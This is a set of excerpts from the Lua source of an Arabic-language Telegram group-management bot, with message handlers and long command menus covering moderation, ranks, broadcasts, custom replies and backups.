GetWelcome = ' 𖣳 لم يتم تعيين ترحيب للجروب'
end 
...
local f = ' 𖣳 عدد البوتات التي هي ادمن >> {'..t..'}\n 𖣳 ملاحضه علامة ال (✯) تعني ان البوت ادمن \n'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖣳 العضو » ['..result.title_..'](t.me/'..(text1[3] or 'BK_b_1')..')'..'\n 𖣳 تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if num > 1500 then 
send(msg.chat_id_, msg.id_,'𖣳تستطيع المسح 1500 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
...
send(msg.chat_id_,msg.id_,'𖣳 تم مسح {'..num..'}')  
...
send(msg.chat_id_, msg.id_,"𖣳 تم مسح جميع الميديا")
end
...
send(msg.chat_id_, msg.id_,'𖣳 تم مسح جميع الرسائل المعدله')
end
...
send(msg.chat_id_, msg.id_,' 𖣳 ارسل الكلمه تريد مسحها')
...
send(msg.chat_id_, msg.id_,"𖣳 تم مسح الرد من ردود المتعدده")
...
send(msg.chat_id_, msg.id_,"𖣳تم مسح ردود المتعدده")
end
------------------------------------------------------------------------
if text1 then 
...
send(msg.chat_id_, msg.id_," 𖣳 تم مسح الردود الجروب")
end

if text == ("الردود الجروب") and Manager(msg) then
local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
text = " 𖣳 قائمه الردود الجروب \n┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,' 𖣳 ارسل الكلمه التي تريد مسحها')
...
database:set(bot_id.."BK_b_1:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."BK_b_1:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."BK_b_1:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."BK_b_1:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"𖣳تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."BK_b_1:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."BK_b_1:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
return send(msg.chat_id_, msg.id_,"𖣳ارسل الان الكلمه لمسحها ")
end
if text then  
...
send(msg.chat_id_, msg.id_,' 𖣳 تم مغادرة الجروب') 
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
end
return false  
end
...
Text = '\n 𖣳 تم تعطيل الردود الجروب' 
else
Text = '\n 𖣳 بالتاكيد تم تعطيل الردود الجروب'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
local iduser = result.sender_user_id_
...
if result.id_ then
send(msg.chat_id_, msg.id_,' 𖣳 تعال حبي يصيحونك بل جروب [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
...
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' 𖣳 الشخص الذي قام باضافتك هو » '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖣳 انت دخلت عبر الرابط') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖣳 تم تعطيل امر ضافني') 
end
end

if text == 'تفعيل ضافني' and Manager(msg) then   
if database:get(bot_id..'Added:Me'..msg.chat_id_) then
Text = ' 𖣳 تم تفعيل امر منو ضافني'
database:del(bot_id..'Added:Me'..msg.chat_id_)  
else
Text = ' 𖣳 بالتاكيد تم تفعيل امر منو ضافني'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖣳 تم تعطيل امر منو ضافني'
else
Text = '\n 𖣳 بالتاكيد تم تعطيل امر منو ضافني'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
database:del(bot_id..'Mod:User'..msg.chat_id_)
database:del(bot_id..'Special:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 𖣳 تم تنزيل الكل من الرتب الاتيه \n 𖣳 المميزين ، الادمنيه ، المدراء ، المنشئين \n')
end
...
Text = ' 𖣳 تم تفعيل امر اطردني'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = ' 𖣳 بالتاكيد تم تفعيل امر اطردني'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖣳 تم تعطيل امر اطردني'
else
Text = '\n 𖣳 بالتاكيد تم تعطيل امر اطردني'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "صورتي"  then
...
local rtpg = rtpa
local sofia = {
" 𖣳 اروح فـدوه للـحلوين",
" 𖣳 حلوة حبيبي معليك بالمضغوطين",
" 𖣳 جهرتك منورة ",
" 𖣳 هاي شكد حلو انتة",
" 𖣳 اصلا صوفي احلئ",
" 𖣳 اصلا روظي احلئ",
...
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n 𖣳 ايديك ~⪼ '..msg.sender_user_id_..'\n 𖣳 معرفك ~⪼ '..username..'\n 𖣳 رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n 𖣳 موقعك ~⪼ '..rtpa..'\n 𖣳 تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n 𖣳 رسائلك ~⪼ '..Msguser..'\n 𖣳 نسبه تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n 𖣳 السحكات ~⪼ '..edit..'\n 𖣳 نقاطك ~⪼ '..NUMPGAME..'\n')
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n 𖣳 ايديك ~⪼ '..msg.sender_user_id_..'\n 𖣳 معرفك ~⪼ '..username..'\n 𖣳 رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n 𖣳 موقعك ~⪼ '..rtpa..'\n 𖣳 تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n 𖣳 رسائلك ~⪼ '..Msguser..'\n 𖣳 نسبه  تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n 𖣳 السحكات ~⪼ '..edit..'\n 𖣳 نقاطك ~⪼ '..NUMPGAME..']\n')
else
...
local text = 'تم ايجاد العضو اضغط هنا 𖣳'
...
𖣳 امسح
𖣳 صلاحيه
𖣳 قائمه منع المتحركات
𖣳 قائمه منع الصور
𖣳 قائمه منع الملصقات
𖣳 مسح قائمه المنع
𖣳 المحذوفين
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
𖣳 مسح  امر + الامر القديم  
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
𖣳 الاوامر المضافه ( لعرض الاوامر المضافه ) 
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
𖣳[𝒃𝒂𝒌𝒂𝒓](t.me/BK_b_1)𖣳
]]
keyboard = {} 
...
𖣳 اوامر التغير …
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
𖣳 تغير رد المطور + اسم
𖣳 تغير رد المالك + اسم
𖣳 تغير رد منشئ الاساسي + اسم
𖣳 تغير رد المنشئ + اسم
𖣳 تغير رد المدير + اسم
𖣳 تغير رد الادمن + اسم
𖣳 تغير رد المميز + اسم
𖣳 تغير رد العضو + اسم
𖣳 تغير امر الاوامر
𖣳 تغير امر م1 ~ الئ م10
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
𖣳 اوامر المجموعه 📢 .
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
𖣳 استعاده الاوامر 
𖣳 تحويل كالاتي~⪼ بالرد على صوره او ملصق او صوت او بصمه بالامر ← تحويل 
𖣳 صيح ~ تاك ~ المميزين : الادمنيه : المدراء : المنشئين : المنشئين الاساسين
𖣳 كشف القيود
𖣳 تعين الايدي
𖣳 تغير الايدي
𖣳 الحساب + ايدي الحساب
𖣳 مسح + العدد
𖣳 تنزيل الكل
𖣳 تنزيل جميع الرتب
𖣳 منع + برد
𖣳~ الصور + متحركه + ملصق ~
𖣳 حظر ~ كتم ~ تقيد ~ طرد
𖣳 المحظورين ~ المكتومين ~ المقيدين
𖣳 الغاء كتم + حظر + تقيد ~ بالرد و معرف و ايدي
𖣳 تقيد ~ كتم + الرقم + ساعه
𖣳 تقيد ~ كتم + الرقم + يوم
𖣳 تقيد ~ كتم + الرقم + دقيقه
𖣳 تثبيت ~ الغاء تثبيت
𖣳 الترحيب
𖣳 الغاء تثبيت الكل
𖣳 كشف البوتات
𖣳 الصلاحيات
𖣳 كشف ~ برد ← بمعرف ← ايدي
𖣳 تاك للكل
𖣳 وضع لقب + لقب
𖣳 مسح لقب بالرد
𖣳 اعدادات المجموعه
...
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
𖣳 تفعيل ← تعطيل 
𖣳 المجموعات ← المشتركين ← الاحصائيات
𖣳 رفع ← تنزيل منشئ اساسي
𖣳 مسح الاساسين ← المنشئين الاساسين
𖣳 مسح المنشئين ← المنشئين
𖣳 اسم ~ ايدي + بوت غادر 
𖣳 اذاعه 
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𖣳 اوامر مطور الاساسي
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
𖣳 تفعيل
𖣳 تعطيل
𖣳 مسح الاساسين
...
𖣳 قائمه العام
𖣳 مسح قائمه العام
𖣳 جلب نسخه الاحتياطيه
𖣳 رفع نسخه الاحتياطيه
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
𖣳 اذاعه خاص
𖣳 اذاعه
𖣳 اذاعه بالتوجيه
𖣳 اذاعه بالتوجيه خاص
𖣳 اذاعه بالتثبيت
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
𖣳 جلب نسخه البوت
𖣳 رفع نسخه البوت
𖣳 ضع عدد الاعضاء + العدد
𖣳 ضع كليشه المطور
𖣳 تفعيل/تعطيل الاذاعه
𖣳 تفعيل/تعطيل البوت الخدمي
𖣳 تفعيل/تعطيل التواصل
𖣳 تغير اسم البوت
𖣳 اضف/مسح رد عام
𖣳 الردود العامه
𖣳 مسح الردود العامه
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
𖣳 الاشتراك الاجباري
𖣳 تعطيل الاشتراك الاجباري
𖣳 تفعيل الاشتراك الاجباري
𖣳 مسح رساله الاشتراك
𖣳 تغير رساله الاشتراك
𖣳 تغير الاشتراك
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
𖣳 الاحصائيات
𖣳 المشتركين
𖣳 المجموعات 
𖣳 تفعيل/تعطيل المغادره
𖣳 مسح الجروبات
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
𖣳[𝒃𝒂𝒌𝒂𝒓](t.me/BK_b_1)𖣳
]]
...
𖣳 مصه بالرد
𖣳 رزله بالرد 
𖣳 شنو رئيك بهذا بالرد
𖣳 شنو رئيك بهاي بالرد
𖣳 تحب هذا
┄─━━𝒃𝒂𝒌𝒂𝒓━━─┄
𖣳[𝒃𝒂𝒌𝒂𝒓](t.me/BK_b_1)𖣳
]]
...
send(msg.chat_id_, msg.id_,' 𖣳 تم مسح الامر')  
else
